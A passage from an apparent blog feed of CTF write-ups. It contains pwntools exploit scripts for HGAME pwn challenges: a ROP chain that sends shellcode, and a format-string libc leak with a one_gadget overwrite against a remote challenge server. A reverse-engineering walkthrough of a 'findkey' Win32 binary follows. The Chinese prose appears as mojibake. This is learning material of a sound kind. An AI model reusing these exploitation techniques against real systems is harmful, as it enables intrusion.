payload_2      <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>ch_rsi_address<span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>get_shell_address<span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>ch_rdi_address<span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>read_address<span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>ch_rsi_address<span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>get_shell_address<span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode_1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>read_address<span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>get_shell_address<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
payload_3      <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>shellcode_1<span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> 
payload_4      <span class="token operator">=</span> shellcode_2

io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'how much character do you want to send?'</span><span class="token punctuation">,</span>payload_1<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"hope the letter can be sent safely.\n"</span><span class="token punctuation">,</span>payload_3<span class="token punctuation">)</span>
<span class="token comment">#io.recv()</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_4<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="once"><a href="#once" class="headerlink" title="once"></a>once</h4><p>ç”±äºå¼€äº†PIEï¼Œå…ˆæ³„éœ²åœ°å€ï¼Œå†ç”¨one_gadgeté‚£ä¸€å¥—ï¼Œæœ€åå‡ åˆ†é’Ÿå‡ºæ¥çš„çœŸåˆºæ¿€</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/python3</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#io = process("once")</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libc-2.27.so"</span><span class="token punctuation">)</span>

io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"182.92.108.71"</span><span class="token punctuation">,</span><span class="token number">30107</span><span class="token punctuation">)</span>
<span class="token comment">#gdb.attach(io)</span>


payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">28</span> <span class="token operator">+</span> <span class="token string">'%p'</span> <span class="token operator">+</span> <span class="token string">'%11$p'</span> <span class="token operator">+</span> <span class="token string">'%13$p'</span> <span class="token operator">+</span> <span class="token string">'\xB5'</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
rubbish     <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>
rsp_addr    <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>
main_76     <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>
addr_offset <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\xB5'</span><span class="token punctuation">)</span>

main_76     <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>main_76<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
rsp_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rsp_addr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token comment">#one_gadget offset</span>
addr_offset <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>addr_offset<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>rsp_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

libc_base <span class="token operator">=</span> addr_offset <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">231</span>
									<span class="token number">0x2b10</span>
    

<span class="token comment">#libc.symbols['__libc_start_main'] = 0x2b10</span>
<span class="token comment">#__libc_start_main 0x7f4ed9a1fb10 </span>
<span class="token comment">#0x7ffda43debd0</span>
<span class="token comment">#addr_offset: 0x7f4ed9a1fbf7</span>
<span class="token comment">#libc_base: 0x7f4ed99fe000</span>
<span class="token comment">#one : 0x7f4ed9b0841c</span>


<span class="token comment">#one = libc_base + 0x4f3d5 </span>
one <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x10a41c</span>


io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'%7$n'</span><span class="token punctuation">,</span><span class="token string">'\x00\x00\x00\x00'</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>rsp_addr<span class="token operator">+</span><span class="token number">0x30</span><span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">24</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>main_76<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'%7$n'</span><span class="token punctuation">,</span><span class="token string">'\x00\x00\x00\x00'</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>rsp_addr<span class="token operator">+</span><span class="token number">0x30</span><span class="token operator">+</span><span class="token number">0x70</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">24</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>one<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">~</span>                    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h4 id="Baseå…¨å®¶ç¦"><a href="#Baseå…¨å®¶ç¦" class="headerlink" title="Baseå…¨å®¶ç¦"></a>Baseå…¨å®¶ç¦</h4><p>base64ï¼Œbase32ï¼Œbase16ä¸€æ°”å‘µæˆï¼Œè°¢è°¢é€åˆ†é¢˜ã€‚</p>
]]></content>
      <categories>
        <category>HGAME</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>HGAME</tag>
      </tags>
  </entry>
  <entry>
    <title>findkey</title>
    <url>/2020/12/17/write_up_findkey/</url>
    <content><![CDATA[<h1 id="findkey-write-up"><a href="#findkey-write-up" class="headerlink" title="findkey write_up"></a>findkey write_up</h1><blockquote>
<p> æ²¡æƒ³åˆ°ç»™å°æ˜ç¥ç§˜ç›’å­çš„è®ºå›é«˜æ‰‹å±…ç„¶æ˜¯æœ¬æ¬¡ctfçš„ç­–åˆ’äººä¹‹ä¸€ï¼Œåœ¨æ¯”èµ›çš„æ—¶å€™ï¼Œç¥ç§˜ç›’å­å†ä¸€æ¬¡å‡ºç°ï¼Œå°æ˜ä¸‹æ„è¯†çš„å†æ¬¡é‡å¤ä¹‹å‰çš„æ“ä½œï¼Œç»“æœæ˜¾è€Œæ˜“è§å¾—å¤±è´¥äº†ï¼Œèµ¶ç´§å¸®å°æ˜è§£ç­”è¿™ä¸ªåŠ äº†ç‚¹ä½æ–™çš„ç›’å­ã€‚ æ³¨æ„ï¼šå¾—åˆ°çš„ flag è¯·åŒ…ä¸Š flag{} æäº¤</p>
</blockquote>
<h5 id="æœ€è¿‘é—²æ¥äº‹è´¼å¤šï¼Œåšä¸€é¢˜é€†å‘æš‚ä¸”è¡¨ç¤ºè‡ªå·±æ˜¯ä¸ªreæ‰‹ï¼ˆæ–‡æ˜å…­è¶…å¥½ç©ï¼‰"><a href="#æœ€è¿‘é—²æ¥äº‹è´¼å¤šï¼Œåšä¸€é¢˜é€†å‘æš‚ä¸”è¡¨ç¤ºè‡ªå·±æ˜¯ä¸ªreæ‰‹ï¼ˆæ–‡æ˜å…­è¶…å¥½ç©ï¼‰" class="headerlink" title="æœ€è¿‘é—²æ¥äº‹è´¼å¤šï¼Œåšä¸€é¢˜é€†å‘æš‚ä¸”è¡¨ç¤ºè‡ªå·±æ˜¯ä¸ªreæ‰‹ï¼ˆæ–‡æ˜å…­è¶…å¥½ç©ï¼‰"></a>æœ€è¿‘é—²æ¥äº‹è´¼å¤šï¼Œåšä¸€é¢˜é€†å‘æš‚ä¸”è¡¨ç¤ºè‡ªå·±æ˜¯ä¸ªreæ‰‹ï¼ˆæ–‡æ˜å…­è¶…å¥½ç©ï¼‰</h5><p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/findkey1.jpg" alt="findkey1"></p>
<p> æ‰“å¼€ä¸€çœ‹ï¼Œè¿™ä¸æ˜¯å¾®è½¯çš„æ¨¡æ¿å˜›ï¼Œfileé€‰ä¸­å¯ä»¥ä¸‹æ»‘æ‰¾åˆ°exitï¼Œhelpé€‰ä¸­ä¸‹æ»‘æœ‰ä¸€ä¸ªaboutï¼Œæ‰“å¼€éƒ½æ²¡ä»€ä¹ˆä¸œè¥¿ã€‚æ€ªä¸å¾—å«åšfindkeyã€‚æ­¤æ—¶é¢˜ç›®å¯èƒ½åšä»€ä¹ˆæˆ‘ç¨å¾®æ¸…æ¥šäº†ç‚¹ï¼Œä¸è¿‡ç”±äºæˆ‘å¼€å‘çš„å°‘ï¼Œæ‰€ä»¥ä¸­é—´è¿˜æ˜¯æœ‰ä¸å°‘æ³¢æŠ˜ã€‚</p>
<p> è¿™æ—¶å€™æ‰“å¼€idaçœ‹çœ‹ã€‚ä»WinMain()å…¥æ‰‹ã€‚</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __stdcall <span class="token function">WinMain</span><span class="token punctuation">(</span>HINSTANCE hInstance<span class="token punctuation">,</span> HINSTANCE hPrevInstance<span class="token punctuation">,</span> LPSTR lpCmdLine<span class="token punctuation">,</span> <span class="token keyword">int</span> nShowCmd<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  CHAR Buffer<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+4Ch] [ebp-84h] BYREF</span>
  HACCEL hAccTable<span class="token punctuation">;</span> <span class="token comment">// [esp+B0h] [ebp-20h]</span>
  <span class="token keyword">struct</span> <span class="token class-name">tagMSG</span> Msg<span class="token punctuation">;</span> <span class="token comment">// [esp+B4h] [ebp-1Ch] BYREF</span>

  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>byte_428C54<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  dword_428C50 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">LoadStringA</span><span class="token punctuation">(</span>hInstance<span class="token punctuation">,</span> <span class="token number">0x67u</span><span class="token punctuation">,</span> WindowName<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">LoadStringA</span><span class="token punctuation">(</span>hInstance<span class="token punctuation">,</span> <span class="token number">0x6Du</span><span class="token punctuation">,</span> ClassName<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">set</span><span class="token punctuation">(</span>hInstance<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//set something</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">sub_40100F</span><span class="token punctuation">(</span>hInstance<span class="token punctuation">,</span> nShowCmd<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">LoadStringA</span><span class="token punctuation">(</span><span class="token operator">::</span>hInstance<span class="token punctuation">,</span> <span class="token number">0x6Eu</span><span class="token punctuation">,</span> Buffer<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  hAccTable <span class="token operator">=</span> <span class="token function">LoadAcceleratorsA</span><span class="token punctuation">(</span>hInstance<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPCSTR<span class="token punctuation">)</span><span class="token number">0x6D</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">GetMessageA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Msg<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">TranslateAcceleratorA</span><span class="token punctuation">(</span>Msg<span class="token punctuation">.</span>hwnd<span class="token punctuation">,</span> hAccTable<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Msg<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">TranslateMessage</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">DispatchMessageA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> Msg<span class="token punctuation">.</span>wParam<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>å¯ä»¥çœ‹å‡ºè¿™é‡Œæ²¡æœ‰æˆ‘ä»¬éœ€è¦çš„ä¸œè¥¿ï¼ŒåŸºæœ¬æ¡†æ¶åœ¨è¿™ï¼Œæˆ‘ä»¬åº”è¯¥æ‰¾æ‰¾WndProcï¼Œå¯»æ‰¾ç¨‹åºåœ¨å“ªåšæ‰‹è„šçš„ã€‚</p>
<p>è·Ÿè¿›set( hInstance ),</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">ATOM __cdecl <span class="token function">sub_4011D0</span><span class="token punctuation">(</span>HINSTANCE hInstance<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  WNDCLASSEXA v2<span class="token punctuation">;</span> <span class="token comment">// [esp+4Ch] [ebp-30h] BYREF</span>

  v2<span class="token punctuation">.</span>cbSize <span class="token operator">=</span> <span class="token number">48</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>style <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>lpfnWndProc <span class="token operator">=</span> <span class="token punctuation">(</span>WNDPROC<span class="token punctuation">)</span><span class="token operator">&amp;</span>sub_401014<span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>cbClsExtra <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>cbWndExtra <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>hInstance <span class="token operator">=</span> hInstance<span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>hIcon <span class="token operator">=</span> <span class="token function">LoadIconA</span><span class="token punctuation">(</span>hInstance<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPCSTR<span class="token punctuation">)</span><span class="token number">0x6B</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>hCursor <span class="token operator">=</span> <span class="token function">LoadCursorA</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPCSTR<span class="token punctuation">)</span><span class="token number">0x7F00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>hbrBackground <span class="token operator">=</span> <span class="token punctuation">(</span>HBRUSH<span class="token punctuation">)</span><span class="token number">6</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>lpszMenuName <span class="token operator">=</span> <span class="token punctuation">(</span>LPCSTR<span class="token punctuation">)</span><span class="token number">109</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>lpszClassName <span class="token operator">=</span> ClassName<span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>hIconSm <span class="token operator">=</span> <span class="token function">LoadIconA</span><span class="token punctuation">(</span>hInstance<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPCSTR<span class="token punctuation">)</span><span class="token number">0x6C</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">RegisterClassExA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>è¿™é‡Œçš„sub_401014å…¶å®å°±å®šä¹‰äº†WndProcï¼Œè€Œæˆ‘æ‰¾åˆ°è¿™ä¸ªè¿˜èŠ±äº†ä¸å°‘æ—¶é—´ã€‚è·Ÿè¿›ã€‚</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sub_401014</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">JUMPOUT</span><span class="token punctuation">(</span><span class="token number">0x401640</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œ0x401640æ ‡çº¢äº†ï¼Œè¯´æ˜è¿™é‡Œæ²¡æœ‰è§£æåˆ°ï¼Œ</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<p>è·Ÿè¿›ä¸€çœ‹ï¼ŒåŸæ¥æ²¡æœ‰æ„é€ å‡ºå‡½æ•°ï¼Œç„¶åæˆ‘å°±é€‰ä¸­äº†ä¸€æ®µåŒºåŸŸè‡ªå·±æ„é€ äº†ä¸€ä¸ªWndProcã€‚</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">  <span class="token keyword">if</span> <span class="token punctuation">(</span> times <span class="token operator">==</span> <span class="token number">16</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>String<span class="token punctuation">,</span> <span class="token string">"ctf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v22 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    v23 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">SetWindowTextA</span><span class="token punctuation">(</span>hWndParent<span class="token punctuation">,</span> String<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>Text<span class="token punctuation">,</span> <span class="token string">"Are you kidding me?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">MessageBoxA</span><span class="token punctuation">(</span>hWndParent<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> Buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token operator">++</span>times<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>ç”±äºè¿™ä¸ªåœ°æ–¹çœ‹ä¸Šå»ç®€å•ï¼Œæˆ‘å°±å…ˆè§‚å¯Ÿäº†ä¸€ä¸‹ï¼Œè¿™é‡Œä¼šè·³å‡ºä¸€ä¸ªMessageboxï¼Œé‚£æˆ‘è¯•è¯•ã€‚æ ¹æ®å¾®è½¯çš„Msgçš„å®šä¹‰ï¼Œ0x208ä¸ºWM_MBUTTON,ç„¶åè¿™é‡Œåœ¨timeså˜ä¸º16æ—¶æ‰§è¡Œäº†é‡Œé¢å†…å®¹ï¼Œå¦åˆ™å°±æ˜¯++timesã€‚é‚£æˆ‘é¼ æ ‡ä¸­é”®ç–¯ç‹‚ç‚¹çœ‹çœ‹ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/findkey2.jpg" alt="findkey2"></p>
<p>å“ˆå“ˆï¼ŒAre you kidding me ? definitely yes.</p>
<p>ä¸è¿‡å¾ˆé—æ†¾è¿™ä¸ªå’Œé¢˜ç›®æ²¡å•¥å…³ç³»ã€‚</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> v11 <span class="token operator">==</span> <span class="token number">0x205</span> <span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>String1<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">6</span> <span class="token punctuation">)</span>
    <span class="token function">ExitProcess</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>String1<span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>v20<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v20<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v6 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>String1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>v20<span class="token punctuation">,</span> String1<span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
    v7 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>String1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sub_40101E</span><span class="token punctuation">(</span>String1<span class="token punctuation">,</span> v7<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPSTR<span class="token punctuation">)</span>String1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>Str<span class="token punctuation">,</span> <span class="token string">"0kk`d1a`55k222k2a776jbfgd`06cjjb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>v17<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v17<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v18 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    v19 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>v13<span class="token punctuation">,</span> <span class="token string">"SS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v13<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    v14 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    v15 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    v8 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sub_401005</span><span class="token punctuation">(</span>v13<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>Str<span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">_strcmpi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>String1<span class="token punctuation">,</span> Str<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">SetWindowTextA</span><span class="token punctuation">(</span>hWndParent<span class="token punctuation">,</span> <span class="token string">"flag&#123;&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">MessageBoxA</span><span class="token punctuation">(</span>hWndParent<span class="token punctuation">,</span> <span class="token string">"Are you kidding me?"</span><span class="token punctuation">,</span> <span class="token string">"^_^"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">ExitProcess</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_423030<span class="token punctuation">,</span> <span class="token number">0x32u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v9 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sub_401005</span><span class="token punctuation">(</span>v20<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v12<span class="token punctuation">,</span> v9<span class="token punctuation">)</span><span class="token punctuation">;</span>
